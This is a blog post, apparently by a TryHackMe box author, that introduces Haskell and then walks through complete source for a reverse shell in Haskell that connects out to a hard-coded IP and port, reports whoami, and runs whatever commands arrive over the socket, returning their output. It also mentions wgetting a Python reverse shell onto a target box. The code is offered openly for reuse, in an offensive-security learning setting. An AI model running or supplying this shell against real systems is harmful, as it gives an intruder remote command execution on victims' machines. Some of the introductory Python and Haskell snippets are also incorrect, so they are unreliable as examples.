---
layout: page
title: "Writing A Reverse Shell In Haskell"
permalink: /Writing-A-Reverse-Shell-In-Haskell/
categories: haskell
---

While I was developing a vulnerable box for the TryHackMe teaching platform, I wrote a small Flask app that accepts a Haskell file upload and compiles/runs it. This was intended to be abused by attackers in order to get an initial foothold through running a Haskell program and then escalate to root. Like any good box maker I had to test it and make sure it was solvable. My initial solution to the foothold was a short Haskell program that uses the System.Process library in order to call system functions. Since redirection was really janky I couldn’t do a lot of things, so my workaround was to wget a Python reverse shell and then run it. This worked, but I thought “Surely someone has written a reverse shell in this language”. Much to my surprise, Google turned up empty. Original thought isn’t dead!

I attribute this to a few things: Haskell is a somewhat niche language, it’s not very easy to pick up, and it’s pretty limited in its applications for offensive security. Ironically, Haskell is an incredibly safe language because of all the type checking, lack of side effects, and how easy it makes proving functions! Anyways, I figured that since no one had done it before, I ought to write a reverse shell. I’m currently completing my OSCP and have been using PayloadAllTheThings like a zealot, so this seems like my chance to give back in a very niche fashion if for some reason someone needs a Haskell reverse shell.

# A Brief Introduction To Haskell (Skip this if you just wanna see the shellz)
Here’s a few cool things about Haskell:

* Haskell is statically typed, so if we assign a variable to an integer the compiler knows it’s going to stay an integer
* Functions have no side effects. The only thing that a function can do is compute something and return its value.
* Haskell is lazy. This means it won’t compute values until we actually ask for them. This comes in handy if we, say, want to work with an infinitely long list. We can declare an infinitely long list, and if we try to access list indexes very far into the list, Haskell won’t compute that until we ask for it.
* Haskell is super concise. It’s very easy to write very short, incredibly powerful one liners

Here’s a brief comparison between Haskell and Python, as many people have experience with Python. The problem will be to reverse a list and return a list containing the new first and last index. For example, if the input is [1,2,3,4], the output is [4,1]. We’ll assume “x” is our variable equal to the input.

Python: 

~~~python
x.reverse[0].append(x.reverse[-1])
~~~
If you’re familiar with List objects in Python, you know that what we’re doing behind the scenes is accessing the reverse, getitem (to access the index), and append methods of the List class in order to perform this operation.

Haskell:

~~~haskell
(head (reverse x)):(tail (reverse x)):[]
~~~
In Haskell, we’re calling the head function to get the first item, the reverse function to give us a reversed list, the tail function to get the last item, and then appending it using the “:” list constructor onto an empty list. We did all of this just with functions, how cool is that!

Additionally, we could tell Haskell what we want to input/output from our function. So in this case, we’re inputting a list of integers and returning a list of integers. So we could tell Haskell:
~~~haskell
funcName :: [Int] -> [Int]
~~~
If we try to pass in a string or a list of strings, then Haskell will throw an error at compilation. This can also be abstracted, so if we wanted to take a list of something and return a single something we could declare:
~~~haskell
funcName :: [a] -> a
~~~
Where “a” is our generic data type. Contrast this to Python, where we can take the example above and nothing prevents us from passing in a number. But when the function tries to run, it’ll try to call the reverse method of the Integer class, which will fail because there isn’t one. With Haskell, we know what we’re getting.

This is just a short description of Haskell, it’s an incredibly powerful language and I suggest that you dig deeper into it.

# Writing Our Reverse Shell
Anyways, now that you’ve had a brief introduction to how Haskell works, let’s get into the reverse shell. We’ll dissect it a few lines at a time.

~~~haskell
import Network.Socket hiding (send, sendTo, recv, recvFrom)
import Network.Socket.ByteString (send, recv)
import qualified Data.ByteString.Char8 as B8
import System.Process
import System.IO
import Control.Exception

main = do
        client "192.168.126.128" 1234
~~~

Pretty self explanatory. This is just our imports and our main function call, similar to Java/C/etc.

~~~haskell
client :: String -> Int -> IO ()
client host port = withSocketsDo $ do
                addrInfo <- getAddrInfo Nothing (Just host) (Just $ show port)
                let serverAddr = head addrInfo
~~~

This is the start function that we call in main. I’ve pulled a short snippet because I want to address a few Haskell syntax things.

First, at a high level, what we’re doing here is constructing the addrInfo data type that we need to grab information from to pass to a later function.

Why do some lines have a <- and some have a “let x = y”? The <- operator is used for IO actions in this case. Essentially, it will actually perform the IO operation and then bind it to the variable, performing a monadic binding and let us work with that variable differently. The “let =” operator binds whatever the value is to a variable literally.

The $ operator is used for function application. For (Just $ show port), “Just” is a data type that lets us say “The result of this function MAY BE this, but it also MAY BE Nothing”. The “show” function takes a value and outputs that value as a string. If we had “(Just show port)”, then that could be interpreted as us trying to declare “show” as a variable of the “Maybe” type (of which Just is a subtype). But that’s not what we want, we want to apply Just to the result of “show port”.

~~~haskell
sock <- socket (addrFamily serverAddr) Stream defaultProtocol
connect sock (addrAddress serverAddr)
(_, Just hout, _, _) <- createProcess (proc "whoami" []) {std_out = CreatePipe}
resultOut <- hGetContents hout
let resultMsg = B8.pack resultOut
send sock resultMsg
msgSender sock
close sock
~~~

Now the rest of this function. We’ll pass in the first item of our addrInfo data type, serverAddr, cast as an addrFamily data type. Haskell will detect the protocol used for us, in this case TCP. This creates the socket that we’re going to pass around for the rest of this program. Then, we’ll call the connect function and pass in the socket and server address.

Next is the meat and potatoes of the command execution, we call createProcess and pass in “whoami” as our process, creating a pipe for standard out. I used whoami as it works on both Linux and Windows. If you’re curious about the underscores in (_, Just hout, _, _) those essentially mean that we don’t care what they are because we’re not going to use them, so we don’t need to assign them to a variable. If we wanted to use them all they would be stdin, stdout, stderr, and a handle to the process (in that order). Then we can get the results of our command using the IO operation hGetContents and use ByteString to pack them into a network friendly form. Then we’ll send the result of that command, so the user on the receiving end knows who they are, and call the function that’s going to do the heavy lifting.

~~~haskell
msgSender :: Socket -> IO ()
msgSender sock = do
  let msg = B8.pack ""
  send sock msg
  rMsg <- recv sock 2048
  let split_cmd = words (filter (/= '\n') (B8.unpack rMsg))
  print split_cmd
  result <- try' $ createProcess (proc (head split_cmd) (tail split_cmd)) {std_out = CreatePipe, std_err = CreatePipe}
  case result of 
    Left ex                            -> sendError sock ex
    Right (_, Just hout, Just herr, _) -> sendResult sock (Nothing, Just hout, Just herr, Nothing)
  msgSender sock
~~~

If you’ve made it this far, I promise that we’re almost done with all the convoluted Haskell stuff! This function is going to infinitely loop in order to call commands, return their output, and then wait again. The program receives a message from the user, removes all new lines via filter, and uses the words function to create a list split on every space. We have to do this as createProcess takes a list of arguments to the command. Then, we’ll run our program the same as before, but this time we’ll also create an std_err pipe as we want to know when things go wrong. You’ll also notice the “try’” function call with the $ function applicator. 

~~~haskell
try' :: IO a -> IO (Either IOException a)
try' = try
~~~

Adding an apostrophe to a function name is the standard way to denote a modified version of an existing function in Haskell. This takes the existing try function, but specifies it so that it takes a generic IO type in and returns an “Either” data type, which allows us to handle exceptions. This is necessary because while a command returning an error isn’t a problem, if we try to run a non-existent command then the shell would just crash.

We can then use a case statement for error handling.In other languages this would be a switch statement or a series of if statements. Our try function will return “Left” if the command had an exception, and “Right” if it succeeded. So if it fails, we’ll send the error message back to the user. If it didn’t fail, we’ll send back the output and any error messages that were a product of the command. Then we call the function again and loop back. 

~~~haskell
sendError sock err = do
  let errorMsg = B8.pack ("Error:" ++ show err ++ "\n")
  send sock errorMsg
  
sendResult sock (_, Just hout, Just herr, _) = do
    resultOut <- hGetContents hout
    errorOut <- hGetContents herr
    let resultMsg = B8.pack resultOut
    let errorMsg = B8.pack errorOut
    send sock resultMsg
    send sock errorMsg
~~~

The last component are the functions that will send a system error back to the user if the command causes an exception, and the function that sends back the results of the command. These are pretty self explanatory.

And that’s how you implement a reverse shell in Haskell! Hopefully you learned something new from this post. If you’ve never used a functional programming language before, I highly recommend that you do a bit of reading on them. Personally I wasn’t super fluent with Python’s Lambda functions or list comprehensions, but after learning some Haskell I have no problem writing them on the fly. There’s no feeling of power quite like writing a 500 character one liner to process a data set that would’ve taken 20 characters in Excel.
